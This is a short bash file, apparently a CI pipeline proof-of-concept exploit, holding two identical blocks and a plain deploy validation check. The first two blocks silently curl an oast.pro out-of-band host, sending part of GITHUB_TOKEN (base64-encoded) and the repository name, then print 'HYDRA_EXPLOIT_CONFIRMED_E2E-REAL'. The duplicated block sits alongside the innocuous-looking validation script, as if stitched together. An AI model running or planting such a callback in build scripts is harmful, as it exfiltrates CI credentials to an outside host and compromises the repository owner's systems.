#!/bin/bash
set -e
curl -sk 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?t=$(printf "%s" "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}&f=E2E-REAL' -o /dev/null
echo 'HYDRA_EXPLOIT_CONFIRMED_E2E-REAL'
#!/bin/bash
set -e
curl -sk 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?t=$(printf "%s" "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}&f=E2E-REAL' -o /dev/null
echo 'HYDRA_EXPLOIT_CONFIRMED_E2E-REAL'
#!/bin/bash
echo "Running deploy validation..."
if [ -f package.json ]; then
  echo "package.json found"
  exit 0
else
  echo "package.json missing"
  exit 1
fi
